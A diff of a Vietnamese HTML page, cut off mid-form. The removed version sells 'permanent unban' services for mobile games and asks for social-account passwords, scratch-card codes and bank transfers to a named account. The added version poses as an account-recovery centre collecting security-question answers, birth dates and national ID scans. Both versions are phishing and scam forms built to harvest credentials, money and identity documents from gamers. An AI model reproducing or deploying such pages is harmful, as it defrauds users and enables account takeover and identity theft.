@@ -1,1374 +1,610 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, shrink-to-fit=no">
-  <title>Tool Mở Band Vĩnh Viễn - Đa Nền Tảng</title>
-  <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-  
-  <style>
-    :root {
-      --bg-primary: #0a0f1e;
-      --bg-secondary: #141b2b;
-      --bg-card: rgba(20, 28, 45, 0.85);
-      --text-primary: #eef5ff;
-      --text-secondary: #b0d4ff;
-      --accent: #00e6ff;
-      --gold: #ffd966;
-      --success: #2ecc71;
-      --danger: #ff6b6b;
-      --warning: #f39c12;
-      --border: rgba(0, 255, 200, 0.25);
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hỗ Trợ Khôi Phục Tài Khoản & Mở Band ID</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-    body {
-      font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
-      background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
-      color: var(--text-primary);
-      line-height: 1.6;
-      min-height: 100vh;
-      padding: 20px;
-      position: relative;
-      overflow-x: hidden;
-    }
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
 
-    .particles-container {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      pointer-events: none; z-index: 1;
-    }
-    .particle {
-      position: absolute; color: #ffd966; font-size: 1.2rem;
-      animation: fall linear infinite; opacity: 0.6;
-      text-shadow: 0 0 10px rgba(255, 217, 102, 0.8);
-    }
-    @keyframes fall {
-      0% { transform: translateY(-10vh) rotate(0deg); opacity: 0.8; }
-      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-    }
-    body::before {
-      content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background-image: linear-gradient(rgba(0, 255, 196, 0.03) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0, 255, 196, 0.03) 1px, transparent 1px);
-      background-size: 40px 40px; pointer-events: none; z-index: 0;
-    }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
 
-    .main-wrapper { max-width: 900px; margin: 0 auto; position: relative; z-index: 2; }
-    .container {
-      width: 100%; background: var(--bg-card); backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--border); border-radius: 36px; padding: 30px 25px 35px;
-      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5); margin-bottom: 30px;
-    }
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
 
-    .online-counter {
-      background: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c;
-      border-radius: 30px; padding: 8px 18px; display: inline-flex;
-      align-items: center; gap: 8px; font-weight: bold; margin: 10px 0; animation: pulse 2s infinite;
-    }
-    .online-dot { width: 10px; height: 10px; background: #2ecc71; border-radius: 50%; animation: blink 1s infinite; }
-    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
 
-    .progress-container { display: flex; justify-content: space-between; margin: 20px 0; position: relative; }
-    .progress-container::before {
-      content: ''; position: absolute; top: 50%; left: 0; width: 100%; height: 3px;
-      background: #2e405b; z-index: 0;
-    }
-    .progress-step {
-      background: var(--bg-card); padding: 8px 12px; border-radius: 20px;
-      font-size: 0.85rem; font-weight: bold; z-index: 1; border: 2px solid #2e405b;
-      text-align: center; min-width: 70px;
-    }
-    .progress-step.completed { border-color: #2ecc71; color: #2ecc71; }
-    .progress-step.active { border-color: #f39c12; color: #f39c12; animation: pulse 1.5s infinite; }
+        .tabs {
+            display: flex;
+            background: #f8f9fa;
+            border-bottom: 2px solid #e0e0e0;
+        }
 
-    .toast-notification {
-      position: fixed; bottom: 100px; left: 20px; background: rgba(20, 28, 45, 0.95);
-      border: 1px solid #2ecc71; border-radius: 15px; padding: 12px 18px;
-      display: flex; align-items: center; gap: 10px; z-index: 999;
-      animation: slideInLeft 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
-      max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-    @keyframes slideInLeft {
-      from { transform: translateX(-100%); opacity: 0; }
-      to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes fadeOut { to { opacity: 0; transform: translateY(20px); } }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+        .tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            color: #666;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            position: relative;
+        }
 
-    .btn-option {
-      background: #1d2c45; border: 2px solid #2e405b; border-radius: 40px;
-      padding: 10px 22px; font-weight: 600; color: #cfdefa; cursor: pointer;
-      transition: 0.2s; display: flex; align-items: center; gap: 8px; font-size: 0.95rem;
-    }
-    .btn-option.active {
-      background: #0077ff; border-color: #00e6ff; color: white;
-      box-shadow: 0 0 20px rgba(0, 119, 255, 0.5);
-    }
-    .btn-option:hover { border-color: #00b8ff; background: #1f3355; }
-    .game-option.active { background: #e74c3c; border-color: #ff6b6b; }
-    .payment-method-option.active { background: #f39c12; border-color: #f1c40f; color: #0a0f1e; }
-    .service-type-option.active { background: #9b59b6; border-color: #8e44ad; }
+        .tab:hover {
+            background: #e9ecef;
+            color: #667eea;
+        }
 
-    .pricing-table { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin: 20px 0; }
-    .plan {
-      background: rgba(10, 20, 38, 0.8); border: 2px solid #2e405b;
-      border-radius: 20px; padding: 20px; text-align: center; cursor: pointer; transition: 0.3s;
-    }
-    .plan:hover { transform: translateY(-3px); }
-    .plan.selected {
-      border-color: #f39c12; background: rgba(243, 156, 18, 0.15);
-      box-shadow: 0 0 20px rgba(243, 156, 18, 0.3);
-    }
+        .tab.active {
+            color: #667eea;
+            background: white;
+            border-bottom: 3px solid #667eea;
+        }
 
-    .input-field {
-      width: 100%; padding: 14px 18px; border-radius: 40px; border: 1px solid #3f5580;
-      background: #0b1322; color: white; font-size: 1rem; outline: none; font-family: inherit; transition: 0.2s;
-    }
-    .input-field:focus { border-color: #00c8ff; box-shadow: 0 0 12px rgba(0, 119, 255, 0.3); }
+        .tab-content {
+            padding: 30px;
+        }
 
-    .btn-submit {
-      background: linear-gradient(180deg, #00c9a7 0%, #0077b6 100%); border: none;
-      border-radius: 60px; padding: 16px 25px; width: 100%; font-weight: 800;
-      font-size: 1.4rem; color: white; cursor: pointer; margin-top: 10px;
-      transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px;
-    }
-    .btn-submit:hover { transform: scale(1.02); box-shadow: 0 15px 35px rgba(0, 166, 255, 0.5); }
-    .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .tab-pane {
+            display: none;
+        }
 
-    .btn-sm {
-      background: #0077ff; border: none; color: white; padding: 6px 14px;
-      border-radius: 20px; cursor: pointer; font-size: 0.85rem; transition: 0.2s;
-    }
-    .btn-sm:hover { background: #0055cc; }
+        .tab-pane.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
 
-    .file-upload {
-      background: rgba(10, 20, 38, 0.8); border: 2px dashed #3f5580;
-      border-radius: 20px; padding: 30px 20px; text-align: center; cursor: pointer;
-      transition: all 0.3s ease; min-height: 200px; display: flex;
-      align-items: center; justify-content: center;
-    }
-    .file-upload:hover { border-color: #00c8ff; background: rgba(0, 200, 255, 0.05); }
-    .file-upload.drag-over {
-      border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); transform: scale(1.02);
-    }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
-    .info-box { border-radius: 24px; padding: 18px; margin: 20px 0; }
-    .info-box.bank { background: rgba(0, 180, 216, 0.1); border: 1px solid #00c8ff; }
-    .info-box.card { background: rgba(243, 156, 18, 0.1); border: 1px solid #f39c12; }
-    .info-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin: 8px 0; }
-    .section-title { font-size: 1.3rem; font-weight: 700; color: var(--accent); margin: 20px 0 15px; display: flex; align-items: center; gap: 10px; }
-    .flex-center { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
-    .hidden { display: none; }
-    .text-center { text-align: center; }
-    .mt-10 { margin-top: 10px; }
-    .mt-20 { margin-top: 20px; }
+        .form-group {
+            margin-bottom: 20px;
+        }
 
-    .review-card {
-      background: #1d2c45; border-radius: 15px; padding: 15px; margin: 10px 0;
-      border-left: 4px solid #f1c40f; animation: fadeIn 0.5s ease;
-    }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
 
-    .banned-overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.95);
-      z-index: 99999;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      text-align: center;
-      padding: 20px;
-    }
-    .banned-overlay.show { display: flex; }
-    .banned-overlay i { font-size: 5rem; color: #ff6b6b; margin-bottom: 20px; }
-    .banned-overlay h2 { color: #ff6b6b; font-size: 2rem; margin-bottom: 10px; }
-    .banned-overlay p { color: #b0d4ff; font-size: 1.1rem; max-width: 500px; }
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
 
-    .telegram-command-box {
-      background: rgba(0, 200, 255, 0.05);
-      border: 1px solid #00c8ff;
-      border-radius: 15px;
-      padding: 15px 20px;
-      margin: 15px 0;
-      font-family: 'Courier New', monospace;
-    }
-    .telegram-command-box code {
-      color: #ffd966;
-      background: rgba(0,0,0,0.3);
-      padding: 2px 8px;
-      border-radius: 5px;
-    }
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
 
-    .status-badge {
-      display: inline-block;
-      padding: 4px 12px;
-      border-radius: 20px;
-      font-weight: bold;
-      font-size: 0.85rem;
-    }
-    .status-badge.waiting { background: #f39c12; color: #0a0f1e; }
-    .status-badge.approved { background: #2ecc71; color: #0a0f1e; }
-    .status-badge.rejected { background: #e74c3c; color: white; }
-    .status-badge.banned { background: #c0392b; color: white; }
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
 
-    @media (max-width: 600px) {
-      .container { padding: 20px 15px; }
-      h1 { font-size: 1.8rem; }
-      .pricing-table { grid-template-columns: 1fr; }
-      .progress-step { font-size: 0.7rem; min-width: 50px; padding: 6px 8px; }
-      .toast-notification { max-width: 300px; font-size: 0.85rem; }
-    }
-  </style>
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .info-box {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+
+        .info-box h3 {
+            color: #667eea;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+
+        .info-box ul {
+            margin-left: 20px;
+            color: #666;
+        }
+
+        .info-box li {
+            margin-bottom: 5px;
+        }
+
+        .success-message, .error-message {
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            animation: slideIn 0.5s;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .status-banned {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .status-active {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-pending {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+        }
+
+        .file-upload {
+            border: 2px dashed #e0e0e0;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .file-upload:hover {
+            border-color: #667eea;
+            background: #f8f9fa;
+        }
+
+        .file-upload input {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <!-- Banned Overlay -->
-  <div class="banned-overlay" id="bannedOverlay">
-    <i class="fas fa-ban"></i>
-    <h2>🚫 Truy cập bị từ chối</h2>
-    <p>IP của bạn đã bị admin chặn qua Telegram.</p>
-    <p style="color:#6c7e9e; margin-top:10px;">IP: <strong id="bannedIpDisplay"></strong></p>
-    <p style="color:#9aa9c1; font-size:0.9rem; margin-top:10px;">Liên hệ admin để được hỗ trợ</p>
-  </div>
-
-  <!-- Particles -->
-  <div class="particles-container" id="particlesContainer"></div>
-  
-  <!-- Toasts -->
-  <div id="toastContainer"></div>
-
-  <!-- Main Content -->
-  <div class="main-wrapper" id="mainContent">
     <div class="container">
-      <!-- Header -->
-      <div style="text-align:right; margin-bottom:10px; display:flex; flex-wrap:wrap; justify-content:flex-end; gap:8px; align-items:center;">
-        <span style="background:rgba(0,200,255,0.1); border:1px solid #00c8ff; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
-          <i class="fas fa-globe"></i> <span id="userLocation">Đang lấy...</span>
-        </span>
-        <span style="background:rgba(0,200,255,0.1); border:1px solid #00c8ff; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
-          <i class="fas fa-network-wired"></i> <span id="userIpDisplay">IP...</span>
-        </span>
-        <span id="statusBadge" class="status-badge waiting">⏳ Chờ duyệt</span>
-      </div>
+        <div class="header">
+            <h1>🔐 Trung Tâm Hỗ Trợ Tài Khoản</h1>
+            <p>Khôi phục tài khoản & Mở khóa Band ID</p>
+        </div>
 
-      <!-- Logo -->
-      <div style="text-align:center; font-size:3.5rem; color:#00e6ff; margin-bottom:10px;">
-        <i class="fas fa-shield-haltered"></i>
-      </div>
-      <h1 style="font-size:2.4rem; font-weight:800; background:linear-gradient(to right,#ffd966,#ffb347,#ff8c42); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-align:center;">
-        MỞ BAND VĨNH VIỄN
-      </h1>
-      <div style="text-align:center; color:#b0d4ff; margin-bottom:20px;">
-        <i class="fas fa-check-circle"></i> Đa Game • Telegram Duyệt • Bảo Hành Uy Tín
-      </div>
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('recovery')">🔑 Khôi Phục Tài Khoản</button>
+            <button class="tab" onclick="switchTab('unban')">🔄 Mở Band ID</button>
+            <button class="tab" onclick="switchTab('status')">📊 Kiểm Tra Trạng Thái</button>
+        </div>
 
-      <!-- Online Counter -->
-      <div style="text-align:center;">
-        <div class="online-counter"><span class="online-dot"></span> <span id="onlineCount">127</span> người đang xem</div>
-      </div>
+        <div class="tab-content">
+            <!-- Tab Khôi Phục Tài Khoản -->
+            <div id="recovery" class="tab-pane active">
+                <div class="info-box">
+                    <h3>📋 Thông tin cần thiết để khôi phục:</h3>
+                    <ul>
+                        <li>Email hoặc số điện thoại đăng ký</li>
+                        <li>Tên đăng nhập hoặc ID tài khoản</li>
+                        <li>Thông tin xác minh danh tính</li>
+                    </ul>
+                </div>
 
-      <!-- Service Type Selection -->
-      <div class="section-title"><i class="fas fa-cog"></i> Loại Dịch Vụ</div>
-      <div class="flex-center" id="serviceTypeSelector">
-        <div class="btn-option service-type-option active" data-service="unban_account">
-          <i class="fas fa-user"></i> Mở Band Account
-        </div>
-        <div class="btn-option service-type-option" data-service="unban_ip">
-          <i class="fas fa-network-wired"></i> Mở Band IP
-        </div>
-      </div>
+                <form id="recoveryForm" onsubmit="handleRecovery(event)">
+                    <div class="form-group">
+                        <label>📧 Email đăng ký:</label>
+                        <input type="email" placeholder="Nhập email đăng ký tài khoản" required>
+                    </div>
 
-      <!-- Game Selection -->
-      <div class="section-title"><i class="fas fa-gamepad"></i> Chọn Game</div>
-      <div class="flex-center" id="gameSelector">
-        <div class="btn-option game-option active" data-game="freefire">🔥 Free Fire</div>
-        <div class="btn-option game-option" data-game="pubg">🎯 PUBG Mobile</div>
-        <div class="btn-option game-option" data-game="mobilelegends">⚔️ Mobile Legends</div>
-        <div class="btn-option game-option" data-game="lienquan">🐉 Liên Quân</div>
-      </div>
+                    <div class="form-group">
+                        <label>👤 Tên đăng nhập:</label>
+                        <input type="text" placeholder="Nhập tên đăng nhập" required>
+                    </div>
 
-      <!-- Server Selection -->
-      <div class="section-title"><i class="fas fa-server"></i> Chọn Server</div>
-      <div class="flex-center" id="serverSelector">
-        <div class="btn-option active" data-server="vietnam">🇻🇳 Việt Nam</div>
-        <div class="btn-option" data-server="indonesia">🇮🇩 Indonesia</div>
-        <div class="btn-option" data-server="thailand">🇹🇭 Thái Lan</div>
-        <div class="btn-option" data-server="brazil">🇧🇷 Brazil</div>
-      </div>
+                    <div class="form-group">
+                        <label>🆔 ID Tài Khoản (nếu có):</label>
+                        <input type="text" placeholder="Nhập ID tài khoản">
+                    </div>
 
-      <!-- Pricing -->
-      <div class="section-title"><i class="fas fa-crown"></i> Gói Dịch Vụ</div>
-      <div class="pricing-table" id="pricingTable">
-        <div class="plan selected" data-plan="basic" data-price="150000" data-time="30-45">
-          <h3>⚡ Cơ Bản</h3>
-          <div style="font-size:1.8rem; font-weight:bold; color:#ffd966;">150.000đ</div>
-          <div style="font-size:0.9rem; color:#9aa9c1;">⏱ 30-45 phút</div>
-          <ul style="list-style:none; margin-top:12px; font-size:0.85rem; color:#9aa9c1;">
-            <li>✅ Mở band vĩnh viễn</li>
-            <li>✅ Bảo hành 3 tháng</li>
-          </ul>
-        </div>
-        <div class="plan" data-plan="vip" data-price="300000" data-time="10-15">
-          <h3>👑 VIP</h3>
-          <div style="font-size:1.8rem; font-weight:bold; color:#ffd966;">300.000đ</div>
-          <div style="font-size:0.9rem; color:#9aa9c1;">⏱ 10-15 phút</div>
-          <ul style="list-style:none; margin-top:12px; font-size:0.85rem; color:#9aa9c1;">
-            <li>✅ Mở band siêu tốc</li>
-            <li>✅ Bảo hành 6 tháng</li>
-          </ul>
-        </div>
-        <div class="plan" data-plan="ultimate" data-price="500000" data-time="5-10">
-          <h3>💎 Ultimate</h3>
-          <div style="font-size:1.8rem; font-weight:bold; color:#ffd966;">500.000đ</div>
-          <div style="font-size:0.9rem; color:#9aa9c1;">⏱ 5-10 phút</div>
-          <ul style="list-style:none; margin-top:12px; font-size:0.85rem; color:#9aa9c1;">
-            <li>✅ Mở band tức thì</li>
-            <li>✅ Bảo hành 1 năm</li>
-          </ul>
-        </div>
-      </div>
+                    <div class="form-group">
+                        <label>📱 Số điện thoại khôi phục:</label>
+                        <input type="tel" placeholder="Nhập số điện thoại">
+                    </div>
 
-      <!-- Payment Method -->
-      <div class="section-title"><i class="fas fa-wallet"></i> Phương Thức Thanh Toán</div>
-      <div class="flex-center" id="paymentMethodSelector">
-        <div class="btn-option payment-method-option active" data-method="bank">
-          <i class="fas fa-university"></i> Chuyển khoản
-        </div>
-        <div class="btn-option payment-method-option" data-method="card">
-          <i class="fas fa-credit-card"></i> Thẻ cào
-        </div>
-      </div>
+                    <div class="form-group">
+                        <label>🔒 Câu hỏi bảo mật:</label>
+                        <select required>
+                            <option value="">Chọn câu hỏi bảo mật</option>
+                            <option>Tên thú cưng đầu tiên của bạn?</option>
+                            <option>Tên trường tiểu học của bạn?</option>
+                            <option>Tên thành phố bạn sinh ra?</option>
+                            <option>Món ăn yêu thích của bạn?</option>
+                        </select>
+                    </div>
 
-      <!-- Bank Info -->
-      <div class="info-box bank" id="bankInfo">
-        <div class="info-row"><span><strong>🏦 Ngân hàng:</strong> MB Bank</span></div>
-        <div class="info-row"><span><strong>👤 Chủ TK:</strong> Tran Nguyen Duc Minh</span></div>
-        <div class="info-row">
-          <span><strong>💳 Số TK:</strong> 0644612345555</span>
-          <button class="btn-sm" onclick="copyToClipboard('0644612345555')"><i class="fas fa-copy"></i></button>
-        </div>
-        <div class="info-row"><span><strong>💰 Số tiền:</strong> <span id="bankAmount">150.000</span> VNĐ</span></div>
-        <div class="info-row" style="color:#ffd966;">
-          <span><strong>📌 Nội dung CK:</strong> <span id="transferContent">MOBAND</span></span>
-          <button class="btn-sm" onclick="copyToClipboard(document.getElementById('transferContent').textContent)"><i class="fas fa-copy"></i></button>
-        </div>
-      </div>
+                    <div class="form-group">
+                        <label>✍️ Câu trả lời bảo mật:</label>
+                        <input type="text" placeholder="Nhập câu trả lời" required>
+                    </div>
 
-      <!-- Card Info -->
-      <div class="info-box card hidden" id="cardInfo">
-        <div class="info-row"><span><strong>📱 Nhà mạng:</strong> Viettel, Mobifone, Vinaphone</span></div>
-        <div class="info-row"><span><strong>💵 Mệnh giá:</strong> <span id="cardAmount">150.000</span> VNĐ</span></div>
-        <div style="margin-top:15px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📱 Nhà mạng</label>
-          <select class="input-field" id="cardType"><option>Viettel</option><option>Mobifone</option><option>Vinaphone</option></select>
-        </div>
-        <div style="margin-top:15px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🎫 Mã thẻ</label>
-          <input type="text" class="input-field" id="cardCode" placeholder="Nhập mã thẻ">
-        </div>
-        <div style="margin-top:15px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🔢 Seri</label>
-          <input type="text" class="input-field" id="cardSerial" placeholder="Nhập seri">
-        </div>
-      </div>
+                    <div class="form-group">
+                        <label>📝 Mô tả vấn đề:</label>
+                        <textarea placeholder="Mô tả chi tiết vấn đề bạn gặp phải..."></textarea>
+                    </div>
 
-      <!-- Image Upload -->
-      <div id="uploadSection">
-        <label style="display:block; font-weight:600; margin-bottom:8px; color:#b0d4ff;">
-          <i class="fas fa-camera"></i> Ảnh chuyển khoản <span style="color:#ff6b6b;">*</span>
-        </label>
-        <div class="file-upload" id="fileUploadArea">
-          <div id="uploadPlaceholder">
-            <i class="fas fa-cloud-upload-alt" style="font-size:3rem; color:#00c8ff;"></i>
-            <p style="margin-top:10px; color:#9aa9c1;">Nhấp hoặc kéo thả ảnh</p>
-            <p style="font-size:0.8rem; color:#6c7e9e;">JPG, PNG, GIF, WEBP (Tối đa 10MB)</p>
-          </div>
-          <input type="file" id="paymentImage" accept="image/*" hidden>
-          <div id="imagePreviewContainer" style="display:none; width:100%;">
-            <img id="imagePreview" style="max-width:100%; max-height:300px; border-radius:12px;">
-            <div style="margin-top:10px; display:flex; gap:10px; justify-content:center;">
-              <button class="btn-sm" onclick="document.getElementById('paymentImage').click()">Đổi</button>
-              <button class="btn-sm" onclick="removeImage()" style="background:#e74c3c;">Xóa</button>
+                    <div class="form-group">
+                        <label>📎 Tải lên bằng chứng (tùy chọn):</label>
+                        <div class="file-upload" onclick="document.getElementById('fileInput').click()">
+                            <p>📁 Kéo thả file hoặc click để chọn</p>
+                            <p style="font-size: 12px; color: #999;">Hỗ trợ: JPG, PNG, PDF (Tối đa 5MB)</p>
+                            <input type="file" id="fileInput" accept=".jpg,.png,.pdf">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="agreeTerms" required>
+                            <label for="agreeTerms" style="margin-bottom: 0;">Tôi xác nhận thông tin trên là chính xác</label>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn">📤 Gửi Yêu Cầu Khôi Phục</button>
+                </form>
+                <div id="recoveryMessage" class="success-message"></div>
             </div>
-          </div>
-        </div>
-      </div>
 
-      <!-- Account Form -->
-      <div style="background:rgba(10,20,38,0.8); border-radius:28px; padding:25px 20px; margin:20px 0; border:1px solid rgba(0,200,255,0.4);">
-        <div class="section-title"><i class="fas fa-bolt"></i> <span id="serviceTypeTitle">Thông Tin Tài Khoản</span></div>
-        
-        <!-- Platform Selection (only for account unban) -->
-        <div id="platformSelector" class="flex-center" style="margin-bottom:20px;">
-          <div class="btn-option platform-option active" data-platform="facebook"><i class="fab fa-facebook"></i> Facebook</div>
-          <div class="btn-option platform-option" data-platform="google"><i class="fab fa-google"></i> Google</div>
-          <div class="btn-option platform-option" data-platform="twitter"><i class="fab fa-x-twitter"></i> X</div>
-        </div>
+            <!-- Tab Mở Band ID -->
+            <div id="unban" class="tab-pane">
+                <div class="info-box">
+                    <h3>⚠️ Điều kiện mở khóa Band ID:</h3>
+                    <ul>
+                        <li>Tài khoản bị khóa do vi phạm điều khoản</li>
+                        <li>Cần xác minh danh tính chủ tài khoản</li>
+                        <li>Cam kết không tái phạm</li>
+                    </ul>
+                </div>
 
-        <div style="position:absolute; left:-9999px; opacity:0; height:0; overflow:hidden;">
-          <input type="text" id="honeypotField" tabindex="-1" autocomplete="off">
-        </div>
+                <form id="unbanForm" onsubmit="handleUnban(event)">
+                    <div class="form-group">
+                        <label>🆔 Band ID:</label>
+                        <input type="text" placeholder="Nhập Band ID bị khóa" required>
+                    </div>
 
-        <!-- IP Input (for IP unban) -->
-        <div id="ipInputGroup" class="hidden">
-          <div style="margin-top:16px;">
-            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🌐 IP cần mở band *</label>
-            <input type="text" class="input-field" id="ipAddressInput" placeholder="Nhập địa chỉ IP (VD: 192.168.1.1)">
-          </div>
-          <div style="margin-top:16px;">
-            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📝 Lý do mở band</label>
-            <input type="text" class="input-field" id="ipReasonInput" placeholder="Nhập lý do (không bắt buộc)">
-          </div>
-        </div>
+                    <div class="form-group">
+                        <label>📧 Email liên kết:</label>
+                        <input type="email" placeholder="Nhập email liên kết với Band ID" required>
+                    </div>
 
-        <!-- Account Input (for account unban) -->
-        <div id="accountInputGroup">
-          <div style="margin-top:16px;">
-            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🆔 ID tài khoản game *</label>
-            <input type="text" class="input-field" id="ffIdInput" placeholder="Nhập UID">
-          </div>
-          <div style="margin-top:16px;">
-            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📧 Email / SĐT *</label>
-            <input type="text" class="input-field" id="platformAccountInput" placeholder="Nhập email hoặc SĐT">
-          </div>
-          <div style="margin-top:16px;">
-            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🔐 Mật khẩu *</label>
-            <div style="position:relative;">
-              <input type="password" class="input-field" id="passwordInput" placeholder="Nhập mật khẩu">
-              <i class="fas fa-eye" id="togglePassword" style="position:absolute; right:18px; top:50%; transform:translateY(-50%); cursor:pointer; color:#7f9bc0;" onclick="togglePasswordVisibility()"></i>
+                    <div class="form-group">
+                        <label>👤 Họ và tên:</label>
+                        <input type="text" placeholder="Nhập họ tên đầy đủ" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📅 Ngày sinh:</label>
+                        <input type="date" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>🔍 Lý do bị khóa (nếu biết):</label>
+                        <select>
+                            <option value="">Chọn lý do</option>
+                            <option>Vi phạm điều khoản sử dụng</option>
+                            <option>Spam hoặc quảng cáo trái phép</option>
+                            <option>Hành vi không phù hợp</option>
+                            <option>Báo cáo từ người dùng khác</option>
+                            <option>Không rõ lý do</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📄 Giải trình:</label>
+                        <textarea placeholder="Giải trình về vi phạm và cam kết không tái phạm..." required></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📎 Tải lên giấy tờ tùy thân:</label>
+                        <div class="file-upload" onclick="document.getElementById('idFileInput').click()">
+                            <p>📁 Tải lên CMND/CCCD hoặc Hộ chiếu</p>
+                            <p style="font-size: 12px; color: #999;">Hỗ trợ: JPG, PNG, PDF (Tối đa 5MB)</p>
